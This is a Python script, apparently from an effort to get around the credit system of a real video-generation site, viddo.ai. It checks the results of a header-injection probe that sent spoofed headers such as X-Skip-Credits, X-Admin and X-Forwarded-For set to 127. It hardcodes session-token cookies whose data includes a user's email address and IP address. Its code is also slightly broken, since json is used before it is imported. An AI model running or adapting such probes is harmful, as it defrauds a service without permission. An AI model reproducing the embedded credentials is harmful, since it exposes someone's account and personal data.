"""
Poll round 2 header injection results manually using partial taskIds
"""
import requests, time

T = 'uVrw1NqmIvzEcGBdHduaJwAzTySq55TN.inTUrq0EHJ%2F24cDxQXOvikggOi2Zk2AX9Olom2%2Brhqs%3D'
D = 'eyJzZXNzaW9uIjp7InNlc3Npb24iOnsiZXhwaXJlc0F0IjoiMjAyNi0wNS0wNVQwODozMjozNi40OTFaIiwidG9rZW4iOiJ1VnJ3MU5xbUl2ekVjR0JkSGR1YUp3QXpUeVNxNTVUTiIsImNyZWF0ZWRBdCI6IjIwMjYtMDQtMjhUMDg6MzI6MzYuNDkxWiIsInVwZGF0ZWRBdCI6IjIwMjYtMDQtMjhUMDg6MzI6MzYuNDkxWiIsImlwQWRkcmVzcyI6IjExMS45My4xMi4xNDIiLCJ1c2VyQWdlbnQiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxNTIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xNTIuMCIsInVzZXJJZCI6ImhtWDdDVHhMZEFYWWxJMElhdUxhTFJWRGhrbUxNTFJtIiwiaWQiOiJQMUR6cVROQ1ZVeklOZ2Y5eEVDZnJtQm1mTk5NeWVwTSJ9LCJ1c2VyIjp7Im5hbWUiOiJuZmoxM0BlZHUtbWFpbC5lZHUucnMiLCJlbWFpbCI6Im5majEzQGVkdS1tYWlsLmVkdS5ycyIsImVtYWlsVmVyaWZpZWQiOnRydWUsImltYWdlIjpudWxsLCJjcmVhdGVkQXQiOiIyMDI2LTA0LTA4VDAzOjM4OjE1LjE1MVoiLCJ1cGRhdGVkQXQiOiIyMDI2LTA0LTA4VDAzOjM4OjE1LjE1MVoiLCJpZCI6ImhtWDdDVHhMZEFYWWxJMElhdUxhTFJWRGhrbUxNTFJtIn0sInVwZGF0ZWRBdCI6MTc3NzM2NTE1Njc0MSwidmVyc2lvbiI6IjEifSwiZXhwaXJlc0F0IjoxNzc3MzY1NDU2NzQxLCJzaWduYXR1cmUiOiJpRzIwRUl2cU5QbVhlTWg3bkhWT2lUUE5LNzNCUXNmbmp1Z09NTFVZcEE4In0'
C = {'__Secure-better-auth.session_token': T, '__Secure-better-auth.session_data': D}
H = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0'}

# From round 2 probe output (partial taskIds — but they ARE the full UUIDs,
# the log was just cut off at the last segment)
task_ids = [
    ('X-Skip-Credits',      '019dd379-df19-73b0-9506-'),
    ('X-Admin',             '019dd379-e85f-7a7f-8082-'),
    ('X-Internal',          '019dd379-f16e-7bb0-bba1-'),
    ('X-Free-Generation',   '019dd379-fa6f-73c1-afe4-'),
    ('X-Dev-Mode',          '019dd37a-0324-750e-ad4d-'),
    ('X-No-Charge',         '019dd37a-0c35-7ef2-9bbb-'),
    ('X-Credits-Override',  '019dd37a-14eb-7d24-b958-'),
    ('X-Bypass-Credits',    '019dd37a-1e36-79d0-8a67-'),
    ('X-Forwarded-For-127', '019dd37a-274f-7bc9-8b29-'),
    ('X-Real-IP-local',     '019dd37a-30ab-7f57-907f-'),
]

print('NOTE: taskIds are truncated (last segment missing) — using /api/creation-list instead')
print()
# Get recent creations instead
r = requests.get('https://viddo.ai/api/creation-list?page=1&pageSize=30',
                 headers=H, cookies=C, timeout=15)
print(f'creation-list: {r.status_code}')
if r.status_code == 200:
    try:
        d = r.json()
        creations = d.get('creations', d.get('list', d.get('data', [])))
        if isinstance(creations, list):
            print(f'Found {len(creations)} creations. Most recent:')
            for c in creations[:20]:
                cid = c.get('id', '')
                status = c.get('status')
                credits = c.get('use_credits')
                model = c.get('model', c.get('type', ''))
                err = c.get('error', '')
                created = c.get('created_at', c.get('createdAt', ''))[:19] if c.get('created_at') or c.get('createdAt') else ''
                prompt = (c.get('prompt') or '')[:40]
                print(f'  {created} | {model:20s} | status={status} credits={credits} | err={err[:40]} | {prompt}')
        else:
            print(json.dumps(d)[:500])
    except Exception as e:
        print(f'parse error: {e}')
        print(r.text[:400])
else:
    print(r.text[:200])

import json
